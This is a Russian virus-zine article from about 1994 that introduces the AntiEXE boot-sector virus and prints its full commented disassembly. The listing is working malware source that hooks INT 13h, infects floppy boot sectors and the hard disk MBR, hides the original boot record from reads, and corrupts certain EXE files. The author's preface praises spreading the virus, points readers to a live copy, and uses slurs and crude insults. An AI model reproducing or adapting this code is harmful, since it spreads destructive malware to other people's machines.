	ANTI-EXE !!! Как он всем надоел !!! Как его все ругают и лечат 
Aidstest'ом, который решил, что попсовое название "AntiEXE" вызовет в юзерах
больший трепет перед этим педерастическим полуФагом-полуФаком. Ну посмотрите
на листинг: кому он что плохое сделал ?! Портит какой-то EXE-шник, так не
по 'MZ', а аж по 8-ми байтовой маске, даже сам Лозинский не знает, что это за
EXE-шник. 
	Не пишите такие безобидные вирусы ! Обругают, обзовут пострашнее и
будут удалять регулярно по 3 раза в день после винды. А удалять его будут еще 
долго...
        А я его люблю, он у меня живет на всех рабочих дискетах, и никогда
не упущу возможности пустить его погулять - милое домашнее животное.
	И еще одна полезная функция: сидит он в памяти, и к оригинальному 
INT 13h можно прямо обратиться, по адресу  INT 0D3h.

Здесь листинг, а сам он в живом виде находится в файле IV_1.00a.
Также поищите хорошенько на своих дисках ;)

;╔════════════════════════════════════════════════════════════════╗
;║                        ANTIEXE  VIRUS                          ║
;║                                                                ║
;║  Commented  by  LovinGod.                                      ║
;║  (C) LovinGod,  Kiev, cuntry of fUcKRAINE, June 1994.          ║
;║  Used disassembler : Sourcer, v5.04                            ║
;╚════════════════════════════════════════════════════════════════╝

; Константы
main_ram_size  equ 413h   ; (0000:0413)- число килобайт RAM   ║ Область данных
timer_low      equ 46Ch   ; (0000:046C)- младший байт таймера ║ BIOS

seg_a		segment	byte public               
		assume	cs:seg_a, ds:seg_a
		org	0
		antiexe		proc	far


		start:                       ; переход на начало вируса
0000  E9 0114		jmp	entry_point  ;  

;║ Область данных.
;║ Здесь расположены переменные,используемые вирусом,
;║ а также таблица параметров зараженного диска
			     	
0003                 db      ?              ; не используется 
0004        cx_val   dw      0105h          ; Сектор,Дорожка ║ адрес оригиналь-
0006        dh_val   db      00h            ; Сторона        ║ ного бута на диске
;║ Здесь же начинается таблица параметров диска
0007         ax_save   dw    0df04h          ; временное хранилище AX ( при обра-
                                               ботке INT 13h )
0009  EB 33 00 02 02        
000E  01 00 		dw          
0010  02                db   02 
0011  70 00	        dw 
0013  A0 F9 05	        
0016  03 00		dw
0018  09 00		dw
001A  02 00		
001C  00 00		
;----------------------------------------------- конец таблицы параметров дискеты       
                                   
001E                    db  'M','Z',40h,00h,21h     ; портит файлы EXE с таким
                        db  00h,88h,37h,01h,0Fh	    ; началом	

0025  0F		dw                          ; не используется

;================================================ Точка входа обработчика INT 13h

0027  80FC			cmp ah,0F9h             ; "Пустая" функция -  
002A  74 52		jz	int13exit		; сразу на выход
002C  2E: A3 0007	mov	word ptr cs:ax_save,ax	; Сохраним AX
0030  CD D3		int	0D3h			; Вызов настоящего INT 13 
0032  72 4A		jc	int13exit		; Выход из обработчика при 
                                                          ошибке
0034  9C		pushf				; Push flags
;------------------------------------------------ Обрабатывает только Функцию чтения 
                                                  секторов (AH=2 при входе в INT )
0035  2E: 80 3E 0008 02	cmp	byte ptr cs:[8],2	; 
003B  75 40		jne	int13iret		; Выход , если не чтение
;------------------------------------------------ Обработка после чтения сектора(ов)
003D  51		push	cx                ; сохраняем регистры, которые
003E  56		push	si                ; будут изменены
003F  57		push	di
0040  1E		push	ds
;------------------------------------------------ Пакость для какого-то файла 
;------------------------------------------------ Проверяем ,равен ли младший байт
;                                                 таймера 3 ?
0041  2B C9		sub	cx,cx             ;        
0043  8E D9		mov	ds,cx             ;  
0045  F6 06 046C 03	test	byte ptr ds:timer_low,3 ;  0:046Ch - тут таймер
004A  74 20		jz	loc_006C	  ; если равен, то вирус ЭТОГО	
                                                  ; не делает 
                                                  ; если маска по 001E совпадет
                                                  ; с началом считанного сектора...
004C  0E		push	cs                
004D  1F		pop	ds                ; ds=cs
004E  8B FB		mov	di,bx             ; bx=адрес буфера, куда считана
                                                  ; инфо. с диска
0050		loc_0050:			  ; см. 0066
0050  8D 36 001E	lea	si,ds:[1Eh]	  ; адрес маски для порчи
0054  B9 0008		mov	cx,8              ; маска длиной 8 байт
0057  57		push	di                ; сохраним 
0058  F3/ A6		repe	cmpsb		  ; Сравниваем ds:[si] с es:[di]
                                                  ; побайтово, пока cx>0 и байты равны                                                          
005A  5F		pop	di                ; адрес буфера ( см.004E )
005B  74 0E		jz	damage  	  ; 
   				  		  ; В данном секторе не найдено
005D  81 C7 0200	add	di,data_0200_e    ; адрес следующего сектора 
0061  2E: FE 0E 0007	dec	byte ptr cs:ax_save ; уменьшаем счетчик (см.002С)
0066  75 E8		jnz	loc_0050	  ; проверены все считанные сектора?
                                                  ; нет - читаем очередной  
0068  EB 02		jmp	short loc_006C    ; да  - выход
006A  90		db	90h
006B		damage:		 		  ;  xref 005B
006B  AA		stosb			  ; Портим 9й байт в секторе
006C		loc_006C:			  ; (см. 004A, 0068)
006C  1F		pop	ds                ; возвращаем регистры (см.003D)
006D  5F		pop	di
006E  5E		pop	si
006F  59		pop	cx
                                                  ; были ли считаны 
0070  83 F9 01		cmp	cx,1              ; дорожка=0,сектор=1,сторона=0 ?
0073  75 08		jne	int13iret   	  ; 
0075  80 FE 00		cmp	dh,0              ; 
0078  75 03		jne	int13iret	  ; нет-выходим из прерывания
007A  E8 0004		call	bootwork   
007D		int13iret:		          
007D  9D			popf		
007E		int13exit:			
007E  CA 0002		retf	2		  ; Выход из прерывания
				antiexe		endp

;▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
; Процедура обработки бут-секторов ( если cчитали его)
; (см.007A)
;▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
		bootwork	proc	near
0081  50		push	ax             ; сохраняем регистры
0082  53		push	bx
0083  51		push	cx
0084  52		push	dx
0085  1E		push	ds
0086  06		push	es
0087  56		push	si
0088  57		push	di
0089  06		push	es      
008A  1F		pop	ds             ; ds = es =адрес буфера
                                               ; cs =     сегмент вируса  
                                               ; Проверка на себя в буте 
                                               ; по совпадению 4х первых байтов  
008B  2E: A1 0000	mov	ax,word ptr cs:[0]
008F  3B 07		cmp	ax,[bx]         
0091  75 18		jne	loc_00AB		
0093  2E: A1 0002	mov	ax,word ptr cs:[2]
0097  3B 47 02		cmp	ax,[bx+2]
009A  75 0F		jne	loc_00AB       ; в буте вируса нет 
                                               ; Читают меня !!!
                                               ; Подставляем настоящий бут !
                                               ; вот где он лежит:
009C  8B 8F 0004	mov	cx,word ptr ds:[4][bx]	;(=5) сектор 5,дорожка 0
00A0  8A B7 0006	mov	dh,byte ptr ds:[6][bx]	;(=1) сторона0 
00A4  B8 0201		mov	ax,201h        ; читаем "правильный" бут
00A7  CD D3		int	0D3h	       ; с помощью чистенького прерывания
00A9  EB 63		jmp	short bootwork_exit 
                                               ; Мы их надули !!! Спокойно уходим.

00AB		loc_00AB:		       
00AB  80 FA 01		cmp	dl,1              
00AE  77 5E		ja	bootwork_exit  ; не трогаем Жесткий диск 
                                               ; (A=0,B=1,C=81h,D=82h)
;----------------------------------------------- вычисляем, куда спрятать оригинальный
;                                                бут этого диска
;
;   Страшные дебри арифметики . Я обломался .
;                                               
;
00B0  8B 47 16		mov	ax,[bx+16h]    ; секторов на 1 FAT
00B3  F6 67 10		mul	byte ptr [bx+10h] ; число FAT'ов  
00B6  03 47 0E		add	ax,[bx+0Eh]    ; число резервных секторов
00B9  52		push	dx             ; 
00BA  B1 04		mov	cl,4
00BC  8B 57 11		mov	dx,[bx+11h]    ; макс.число 32-байтовых элементов Root'a
00BF  D3 EA		shr	dx,cl          ; получаем число секторов на Root
00C1  03 C2		add	ax,dx           
00C3  48		dec	ax             ; ax=[11]/16+[16]*[10]+[0e]-1
00C4  8B 4F 18		mov	cx,[bx+18h]    ; cx=[18]
00C7  51	       push	cx
00C8  D1 E1		shl	cx,1	       ; cx=[18]*2	
00CA  2B D2		sub	dx,dx
00CC  F7 F1		div	cx	       ; ax=dx:ax/cx    ; ax,dx rem=dx:ax/reg
00CE  59	       pop	cx                
00CF  50	       push	ax
00D0  8B C2		mov	ax,dx          ; ax=dx:ax/cx
00D2  2B D2		sub	dx,dx         
00D4  F7 F1		div	cx	       ; ax,dx rem=dx:ax/reg
00D6  8A F0		mov	dh,al
00D8  8A CA		mov	cl,dl
00DA  58	       pop	ax
00DB  8A E8		mov	ch,al
00DD  FE C1		inc	cl
00DF  58		pop	ax
00E0  8A D0		mov	dl,al
			              	       ; Нашли куда спрятать оригинал ?
					       ; Прячем его туда ?	
00E2  2E: 88 36 0006	mov	byte ptr cs:[6],dh	; (=1) 
00E7  2E: 89 0E 0004	mov	word ptr cs:[4],cx	; (=5)
00EC  B8 0301		mov	ax,301h        ; Пишем (ah=3) один (al=1) сектор 
00EF  CD D3		int	0D3h	       ; вызываем настоящее INT 13
00F1  72 1B		jc	bootwork_exit  ; не записано - переходим на настоящий Boot
00F3  0E		push	cs
00F4  07		pop	es             ; es = cs = сегмент вируса
00F5  FC		cld		       ; качать с увеличением si,di
00F6 ·BF 0007		mov	di,7	       ; 
00F9  8B F3		mov	si,bx          ; адрес буфера 
00FB  03 F7		add	si,di          ; с 7-го байта
00FD  B9 0017		mov	cx,17h         ; 
0100  F3/ A4		rep	movsb	       ; Переносим 17h байт из бута
;                                                к себе в вирус - почти вся таблица  
;                                                параметров дискеты (но NDD,гад,ругается)
0102  B8 0301		mov	ax,301h        ; 
0105  33 DB		xor	bx,bx	       ;
0107  B9 0001		mov	cx,1           ; Сектор 1 Сторона 0 
010A  2A F6		sub	dh,dh          ; Дорожка 0 ОдинСектор
                                               ; Пишем в бут сектор
010C  CD D3		int	0D3h	       ; вызов чистого INT 13
010E		bootwork_exit:		       ; xref 00A9, 00AE, 00F1
010E  5F		pop	di             ; восстанавливаем регистры 
010F  5E		pop	si
0110  07		pop	es
0111  1F		pop	ds
0112  5A		pop	dx
0113  59		pop	cx
0114  5B		pop	bx
0115  58		pop	ax
0116  C3		retn                   ; возврат на 007D 
		bootwork	endp
;----------------------------------------------------------------------------
0117		entry_point:
;----------------------------------------------------------------------------                                                
0117  33 FF		xor	di,di	       ; устанавливаем вектор INT 13
0119  8E DF		mov	ds,di          ; на вектор D3
011B  C4 16 004C	les	dx,dword ptr ds:004Ch	
011F  89 16 034C	mov	ds:034C,dx	
0123  8C 06 034E	mov	ds:034E,es
;                                              ; DI=0000
0127  FA		cli	               ; Запретим прерывания,чтобы чего 
0128  8E D7		mov	ss,di          ; не вышло ,
012A  BE 7C00		mov	si,07C00h	; Устанавливаем стек на 0000:7С00
012D  8B E6		mov	sp,si          ; 
012F  FB		sti
0130  1E		push	ds                             
0131  56		push	si
0132  56		push	si
;                                     Уменьшаем обьем доступной RAM на 1 кБ
;                                     Устанавливаем     ES на этот сегмент
;                                     Устанавливаем INT 13 на НовыйСегмент:0027
;                                     перекачиваем  200h   в  НовыйСегмент
;                                     и прыгаем на НовыйСегмент:0155
;------------------------------------
0133  A1 0413		mov	ax,ds:main_ram_size	; (0000:0413)
0136  48		dec	ax
0137  A3 0413		mov	ds:main_ram_size,ax	

013A  B1 06		mov	cl,6                    ; 
013C  D3 E0		shl	ax,cl			
013E  8E C0		mov	es,ax
0140  A3 004E		mov	word ptr ds:004Ch+2,ax	; 
0143  C7 06 004C 0027	mov	word ptr ds:004Ch,27h	; 
0149  50		push	ax                      ; Значение НовогоСегмента
014A  B8 0155		mov	ax,155h
014D  50		push	ax                      ; Знач.НовСегм.для CALL FAR
014E  B9 0100		mov	cx,100h
0151  FC		cld				; 
0152  F3/ A5		rep	movsw			; Перекачиваем [si] в es:[di]
0154  CB		retf                            
;------------------------------------- продолжаем, но уже в НовомСегменте              
0155  33 C0		xor	ax,ax			; AX=0
0157  8E C0		mov	es,ax                   ; ES=0 
                                                        ; Сброс Диска
0159  CD D3		int	0D3h			; Real INT13 call
015B  0E		push	cs
015C  1F		pop	ds
015D  B8 0201		mov	ax,201h                 ; чтение одного сектора
0160  5B		pop	bx                      ; bx = 7с00 (куда читать)
0161  8B 0E 0004	mov	cx,word ptr ds:[4]	; Головка,Сектор (настоящий бут)
0165  83 F9 0D		cmp	cx,0Dh                  ; Мы читаемся с винта,где оригинальный бут
;							  спрятан по 0/1/0D ?
;							  Если да, то читаем его и грузимся.Все!
0168  75 06		jne	loc_0170		; 
016A  BA 0080		mov	dx,80h                  ; Читаем бут винта
016D  CD D3		int	0D3h			; Настоящее INT 13
016F		loc_ret_016F:				; xref 0178, 018A, 0197, 01A7
016F  CB		retf				; Выходим на загрузку
;------------------------------------------------ винчестер не заражен
0170		loc_0170:				; см. 0168
0170  2B D2		sub	dx,dx                   ;
0172  8A 36 0006	mov	dh,byte ptr ds:[6]	; Читаем оригинальный бут того, с чего 
0176  CD D3		int	0D3h			; грузились (для A: B:)
0178  72 F5		jc	loc_ret_016F		; по ошибке -загрузка
;------------------------------------------------ читаем бут винчестера
017A  0E		push	cs                      ; 
017B  07		pop	es                      ; НовыйСегмент:200h
017C  B8 0201		mov	ax,201h                 ; 0дор./1сек./0стор.
017F  BB 0200		mov	bx,200h                 ;
0182  B9 0001		mov	cx,1                    ;
0185  BA 0080		mov	dx,80h                  ;
0188  CD D3		int	0D3h			; INT 13 настоящее
018A  72 E3		jc	loc_ret_016F		; по ошибке - загрузка
;----------------------------------------------- заражен или нет ?
;                                                (проверка сходства 0000 с 0200) по 4м байтам
018C  33 F6		xor	si,si			; 
018E  AD		lodsw				; Загружаем [si] в ax
018F  3B 07		cmp	ax,[bx]
0191  75 06		jne	loc_0199		; 
0193  AD		lodsw				; [si] в ax
0194  3B 47 02		cmp	ax,[bx+2]
0197  74 D6		je	loc_ret_016F		; Похож - идем грузиться
0199		loc_0199:				; см. 0191
;---------------------------------------------- прячем оригинальный бут
0199  B9 000D		mov	cx,0Dh                  ; 
019C  89 0E 0004	mov	word ptr ds:[4],cx	; 0d-сектор,00-сторона
01A0  B8 0301		mov	ax,301h
01A3  50		push	ax
01A4  CD D3		int	0D3h			; запись сектора
01A6  58		pop	ax
01A7  72 C6		jc	loc_ret_016F		; по ошибке - загрузка
;-----------------------
01A9 ·BE 03BE		mov	si,03BEh		; перекачиваем 
01AC ·BF 01BE		mov	di,offset data_01BE	; Partition Table
01AF  B9 0021		mov	cx,21h                  ; MBR'a
01B2  F3/ A5		rep	movsw			; 

01B4  41		inc	cx                      ;
01B5  2B DB		sub	bx,bx                   ; 007c:0000 
01B7  88 36 0006	mov	byte ptr ds:[6],dh	; бут сектор
01BB  CD D3		int	0D3h			; пишем
01BD  CB		retf				; загрузка
;-------------------------------------------------------- Partition Table
01BE  80		data_01BE	db	 80h		
01BF  01 01 00 01 03 1F			db	 01h, 01h, 00h, 01h, 03h, 1Fh
01C5  52 1F 00 00 00 15			db	 52h, 1Fh, 00h, 00h, 00h, 15h
01CB  28 00 00 00 00 01			db	 28h, 00h, 00h, 00h, 00h, 01h
01D1  53 05 03 9F 98 34			db	 53h, 05h, 03h, 9Fh, 98h, 34h
01D7  28 00 00 E8 19 01			db	 28h, 00h, 00h,0E8h, 19h, 01h
01DD  0021[00]				db	 33 dup (0)
01FE  55 AA		end_of_boot	db	 55h,0AAh
			seg_a		ends
					end	start
